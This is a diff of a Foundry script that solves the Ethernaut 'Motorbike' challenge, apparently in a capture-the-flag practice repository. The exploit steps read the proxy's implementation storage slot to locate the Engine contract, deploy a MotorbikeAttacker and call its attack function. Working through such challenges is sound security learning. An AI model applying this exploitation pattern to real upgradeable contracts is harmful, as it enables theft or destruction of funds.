@@ -10,7 +10,8 @@ import "../../src/25-MotorbikeAttacker.sol";
 contract MotorbikeSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
     uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
-    address challengeInstanceOnChain = 0x059Eb4948e7fB39938d5Bb8993A9D2Ce8A443E26; // Change this address into yours after step1 executed.
+    address challengeInstanceOnChain =
+        0x059Eb4948e7fB39938d5Bb8993A9D2Ce8A443E26; // Change this address into yours after step1 executed.
 
     function run() public {
         vm.startBroadcast(heroPrivateKey);
@@ -20,11 +21,8 @@ contract MotorbikeSolution is Script, EthernautHelper {
         //Motorbike: 0x059Eb4948e7fB39938d5Bb8993A9D2Ce8A443E26
         //Engine: 0x9c4CB32C441F89560997738062645F56FD7a112f
 
-        // YOUR SOLUTION HERE
-        address engine = address(uint160(uint256(vm.load(challengeInstance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
-        MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
-        motorbikeAttacker.attack();
-       
+        // Ric Li C's Solution
+
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
         require(levelSuccess, "Challenge not passed yet");
@@ -45,7 +43,16 @@ contract MotorbikeSolution is Script, EthernautHelper {
         console2.log("challengeInstanceOnChain:", challengeInstance);
 
         // YOUR SOLUTION HERE
-        address engine = address(uint160(uint256(vm.load(challengeInstance, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
+        address engine = address(
+            uint160(
+                uint256(
+                    vm.load(
+                        challengeInstance,
+                        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
+                    )
+                )
+            )
+        );
         MotorbikeAttacker motorbikeAttacker = new MotorbikeAttacker(engine);
         motorbikeAttacker.attack();
 
